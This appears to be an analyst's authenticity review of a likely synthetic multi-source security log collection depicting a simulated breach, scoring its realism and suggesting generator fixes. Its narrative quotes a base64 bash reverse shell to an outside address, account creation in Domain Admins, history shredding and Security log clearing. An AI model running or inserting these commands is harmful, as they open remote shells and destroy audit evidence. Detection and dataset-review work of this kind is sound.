# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Synthetic  
**Verdict Confidence:** 68  
**Synthetic-Confidence Score:** 64

## Executive Summary

This is a high-fidelity collection with unusually strong pivotability: the apparent intrusion can be followed across web, endpoint, Windows Security/Sysmon, Zeek, proxy, firewall, and Linux telemetry with credible byte counts and lifecycle ordering. I nevertheless judge it likely synthetic because several required execution companions are absent from otherwise dense endpoint coverage, periodic Linux activity has generator-like omissions, and uncommon syslog/noise families repeat across unrelated hosts with constrained distributions.

## Evidence For Synthetic

- `[contract_gap]` `DC-01` registers `C:\Windows\System32\DeviceSyncSvc.exe` as a service at 2024-03-18 16:20:00 UTC, schedules it at 16:20:04, and executes it at 16:31:42, but there is no preceding file-create/write event for that binary in `DC-01.meridianhcs.local/ecar.json` or the collected Sysmon Event 11 telemetry. A preexisting file is possible, but within the visible compromise sequence this leaves the persistence artifact without an ingress or creation path.
- `[contract_gap]` The source side of the 16:00 UTC PsExec operation is incomplete despite dense endpoint collection. `WS-AJOHNSON-01` shows SMB flows from `10.10.1.35` to `10.10.2.10` on ports 61249 and 61366, while `DC-01` records Aisha Johnson’s network logon, creation of `C:\Windows\PSEXESVC.exe`, the `PSEXESVC` service, and `cmd.exe /c whoami && hostname`; however, no initiating PsExec-like process is visible in the workstation’s eCAR, Security 4688, or Sysmon Event 1 data around that time.
- `[contract_gap]` Later domain-account and persistence actions appear as children of a long-lived `WmiPrvSE.exe` on `DC-01` without a corresponding visible remote-WMI/DCOM initiation or local subscription trigger. At 16:14:56, WMI-spawned commands create `svc_mhsync` and add it to Domain Admins; at 16:20:00 the same provider lineage creates `DeviceSyncSvc`; at 17:50:21 it deletes the account. The collection otherwise records dense DC logons and internal flows, making this repeated trigger gap conspicuous.
- `[distribution_texture]` Several Linux hosts expose a nominally periodic `debian-sa1` CRON series at exact 30-minute intervals but inexplicably omit isolated slots while the hosts continue producing other telemetry. `MAIL-EDGE-01` logs 12:06, 12:36, 13:06, then skips 13:36 before resuming at 14:06; it also skips 17:06. `WEB-EXT-01` skips 14:31 and 17:31 within an otherwise exact `:01/:31` series. The same omissions occur in both syslog and eCAR, so they look like generation-time probabilistic skipping rather than a single-source collection loss.
- `[distribution_texture]` Uncommon Linux message families recur at high frequency across unrelated application, mail, proxy, database, workstation, and public-web roles: “Using degraded feature set,” “Grace period over,” DNS transaction mode switching, IRQ-affinity messages, NUMA balancing, and snap `stateengine.go`/`taskrunner.go` activity. For example, `WEB-EXT-01` contains 30 degraded-resolver messages, 41 grace-period messages, 43 transaction-switch messages, 29 NUMA messages, and 30 IRQ-skip messages in six hours; closely matching families occur on most other Linux hosts. This fleet-wide reuse has a shared template-pool texture.
- `[distribution_texture]` The 986 UFW blocks on `WEB-EXT-01` are dominated by only eight recurring scanner addresses: 37.75.195.175 (176), 145.78.103.167 (167), 45.33.74.51 (156), 38.186.148.245 (144), 74.172.69.175 (115), 156.32.3.55 (98), 175.29.181.188 (78), and 185.249.5.220 (46). Persistent scanners are real, but having almost the entire blocked-probe population drawn from this tiny repeated pool while cycling through a fixed service-port vocabulary is generator-like.
- `[weak_signal]` The attack-related source gap is operationally odd: the initial web reverse shell ends around 13:21 UTC, while the subsequent root shell on `WEB-EXT-01` begins through `ssh.exe root@WEB-EXT-01` from Sophia Martinez’s workstation at 13:39. The latter session is internally coherent, so this is not impossible, but no visible event explains how the actor acquired or exercised that endpoint/account between the two access paths.

## Evidence For Real

- The environment is meaningfully noisy and role-diverse: 18 hosts include a domain controller, file server, database, internal and external web/application systems, mail tiers, proxy, Linux and Windows workstations, and a laptop. The collection contains about 25,805 eCAR records, 13,566 Windows Security events, 4,621 Sysmon events, 11,776 Zeek connections, 3,054 Zeek DNS records, 2,364 Zeek HTTP records, 1,863 TLS records, 12,665 ASA lines, and 227 Snort alerts.
- The initial compromise pivot is technically strong. `WEB-EXT-01` logs a POST from `185.70.41.45` to `/ehr/admin/upload.php` at 13:20:10; eCAR records the Apache-owned `www-data` process executing the base64-decoded `/dev/tcp/45.33.32.30/8443` shell at 13:20:12; Zeek sees source port 49931 at 13:20:13 for 20.719 seconds; and ASA build/teardown records show the same tuple, approximately 20 seconds, and 3,148 bytes.
- The root SSH session from `10.10.1.36:58598` is lifecycle-coherent across sources. `WS-SMARTINEZ-01` creates `ssh.exe root@WEB-EXT-01`, records the outbound flow, and keeps the process alive until 17:53:14. `WEB-EXT-01` records the corresponding root login, shell, discovery commands, nmap scans, and termination; Zeek records an `SF` connection lasting about 15,209 seconds.
- The nmap behavior produces credible network effects. The root shell runs `nmap -sn 10.10.2.0/24` and then `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`; Zeek shows the expected compact burst against six to seven visible hosts with a believable mixture of `SF`, `REJ`, `S0`, and `RSTO`.
- Windows lateral movement and collection are easy to pivot without source-native contradictions. The DC receives the PsExec transport before creating `PSEXESVC`; `svc_mhsync` is created and privileged before its 17:01:02 network logon on `FILE-SRV-01`; compression begins after that login and creates `C:\ProgramData\Microsoft\cache_7f3a.zip`.
- The exfiltration chain has unusually good quantitative agreement. `WS-AJOHNSON-01` starts the SMB copy at 17:16:50; Sysmon records the destination file at 17:22:14; Zeek records roughly 314.34 MB returned over the SMB transfer; Chrome reads the archive and connects to the proxy at 17:24:57; the proxy records a 314,782,961-byte POST; Zeek sees approximately 315.25 MB client-to-server; and ASA reports 331,393,750 total wire bytes over about 22 seconds.
- DNS has useful production-like texture: A, AAAA, TXT, PTR, SRV, MX, NS, and SOA questions; `NOERROR`, `NXDOMAIN`, `SERVFAIL`, and `REFUSED`; varied RTTs and TTLs; resolver, proxy, and internal-service traffic; and realistic UID correlation into connection records.
- Zeek TCP lifecycle texture is varied rather than a single canned history. Successful flows include many histories such as `ShADadfF`, `ShADaDadfF`, `ShADadTtFf`, `ShADadfFGg`, and retransmission variants, while DMZ traffic includes substantial `S0`, reset, reject, and partial-state populations.
- DHCP behavior is host-specific: lease times vary between 3,600, 7,200, and 14,400 seconds; MAC OUIs vary; renewal schedules are offset per client; and request/ack pairs preserve client address, server, hostname, and lease identity.

## Detailed Analysis

The collection spans approximately 2024-03-18 12:00 through 18:00 UTC. It covers 18 hosts, two Zeek observation points, a perimeter ASA, core and perimeter Snort, Windows Security/Sysmon, eCAR, Linux syslog/bash history, proxy access, and public-web access.

The apparent intrusion begins at `WEB-EXT-01`. At 13:20:10, `web_access.log` records `POST /ehr/admin/upload.php` from `185.70.41.45` with HTTP 200. At 13:20:12.629, eCAR records PID 581448, principal `www-data`, executing:

`bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`

The decoded payload opens a bash reverse shell to `45.33.32.30:8443`. Zeek and ASA corroborate `10.10.3.10:49931 -> 45.33.32.30:8443`; Zeek reports 617 original and 1,826 response payload bytes, `SF`, and a 20.719-second duration. This is strong source-to-effect coherence.

At 13:39, a second access path starts from `WS-SMARTINEZ-01`: `ssh.exe root@WEB-EXT-01.meridianhcs.local` creates the connection `10.10.1.36:58598 -> 10.10.3.10:22`. Target login follows at 13:39:49, then root commands enumerate interfaces, hosts, resolver configuration, credentials, the internal /24, `/var/www/html/config.php`, and `/root/.ssh/id_rsa`. The 4.2-hour source process, target session, and Zeek flow terminate coherently near 17:53. The unexplained transition from a short public reverse shell to an internal user workstation remains a weak authenticity concern, not an impossibility.

At 16:00, `DC-01` receives Aisha Johnson’s SMB-backed network logon from `10.10.1.35`, writes `C:\Windows\PSEXESVC.exe`, registers `PSEXESVC`, and runs `cmd.exe /c whoami && hostname`. The transport-before-execution order is credible. The missing workstation-side initiating PsExec process is a notable gap because the source has simultaneous Security 4688, Sysmon Event 1, and eCAR coverage.

At 16:14:56, `DC-01`’s WMI provider creates `svc_mhsync` with a visible password and adds it to Domain Admins. At 16:20, the same lineage registers `DeviceSyncSvc`, pointing to `C:\Windows\System32\DeviceSyncSvc.exe`, and creates an hourly scheduled task. The service binary executes at 16:31:42. Although a preexisting binary is technically possible, no file arrival or creation is visible, and no remote-WMI transport or trigger explains the provider-spawned commands.

At 17:01:02, `FILE-SRV-01` records the service account logging in from `10.10.1.35:51268`, then WMI-originated `net view` and a PowerShell `Compress-Archive` command. The latter creates `C:\ProgramData\Microsoft\cache_7f3a.zip`. At 17:16:50, Aisha’s workstation starts a PowerShell `Copy-Item` from the file server’s administrative share. Zeek records the large SMB response; Sysmon records the local file creation at 17:22:14. Chrome reads that file and at 17:24:57 sends it through `PROXY-01` to `api.westbridge-services.net`. The endpoint, proxy, Zeek, and ASA quantities agree at payload-versus-wire-byte scale, which is a significant realism strength.

Cleanup follows at 17:39 on `WEB-EXT-01` with `shred -u /root/.bash_history`, at 17:42:28 on `DC-01` with encoded PowerShell and `wevtutil cl Security`, and at 17:50:21 with deletion of `svc_mhsync`. Security Event 1102 appears for the audit-log clear. These steps are source-native and temporally viable; I did not treat their narrative completeness as evidence of synthesis.

Baseline activity is substantial: Kerberos and LDAP traffic, failed and successful logons, DHCP renewals, workstation browsing, proxy tunnels, mail/TLS, scheduled Windows maintenance, SSH administration, package operations, public scanning, and firewall teardown states. The main baseline weakness is not thinness but repeated generation texture: the same unusual Linux message families recur broadly, fixed periodic jobs skip slots without a visible host outage, and blocked scans rely heavily on a tiny reusable source pool.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Why it affected the synthetic-confidence score |
|---|---|---:|---|
| `contract_gap` | DC eCAR, Sysmon, Security | `DeviceSyncSvc.exe` persistence | Service registration and execution are visible, but the executable has no visible creation or delivery path in otherwise dense file/process telemetry. |
| `contract_gap` | Workstation eCAR/Sysmon/Security, DC eCAR | PsExec lateral movement | Target-side PSEXESVC evidence and SMB transport are present, but the required source-side initiating process is absent. |
| `contract_gap` | DC endpoint/network telemetry | WMI command lineage | Repeated WMI-spawned account/persistence/cleanup commands lack a visible remote or local WMI trigger. |
| `distribution_texture` | Linux syslog and eCAR | Multiple Linux roles | Exact periodic CRON series contain unexplained single-slot omissions in both source families. |
| `distribution_texture` | Linux syslog | Fleet-wide | Rare resolver, IRQ, NUMA, and snap message families recur at high rates across unrelated hosts. |
| `distribution_texture` | UFW/public-edge noise | `WEB-EXT-01` | Nearly all 986 blocked probes come from eight heavily reused scanner addresses and a compact port pool. |
| `weak_signal` | Web/endpoint/SSH | Initial-access transition | The short public reverse shell and later internal root SSH session are each coherent, but their relationship is unexplained. |

## Realism Score by Category

- **Field format accuracy:** 9 — The reviewed eCAR, Zeek, Windows, proxy, ASA, syslog, and web fields are consistently parseable and source-appropriate.
- **Temporal patterns:** 7 — Attack and lifecycle ordering is strong, but unexplained missing slots in exact periodic Linux CRON sequences reduce authenticity.
- **Cross-source correlation:** 8 — Major web, SSH, PsExec, SMB, collection, proxy, Zeek, and firewall pivots align well; missing initiating/delivery companions prevent a higher score.
- **Behavioral realism:** 8 — Tradecraft, process trees, privileges, service-account use, collection, staging, exfiltration, and cleanup are technically plausible.
- **Environmental consistency:** 6 — Host roles and overall source mix are credible, but fleet-wide reuse of uncommon Linux noise families and the constrained blocked-scan population look templated.

## Recommendations

- If this were synthetic, add the file-delivery event for `C:\Windows\System32\DeviceSyncSvc.exe` before service registration or explicitly establish that the binary predated the window through visible metadata or an earlier read/hash event.
- If this were synthetic, model the source-side process that initiates PsExec from `WS-AJOHNSON-01`, preserving its parent, principal, command line, and relationship to the observed SMB flows.
- If this were synthetic, attach each WMI-spawned command family to a visible remote DCOM/WMI session, local permanent-consumer trigger, or other concrete execution cause.
- If this were synthetic, keep periodic CRON behavior deterministic while the host is up; if a scheduled occurrence is omitted, provide a visible reason such as downtime, cron restart, overload, or a coherent collection gap.
- If this were synthetic, broaden and skew Linux background-message distributions by host role and installed software. Reduce fleet-wide reuse of high-frequency resolver-degradation, IRQ, NUMA, and snap templates.
- If this were synthetic, expand the public-edge blocked-scan source population and vary each scanner’s persistence, port preferences, burst structure, and abandonment behavior rather than drawing almost all probes from eight recurring addresses.
- If this were synthetic, make the transition from the public web shell to the internal root SSH path observable through credential acquisition, endpoint compromise, tunneling, or a clearly independent preexisting access path.
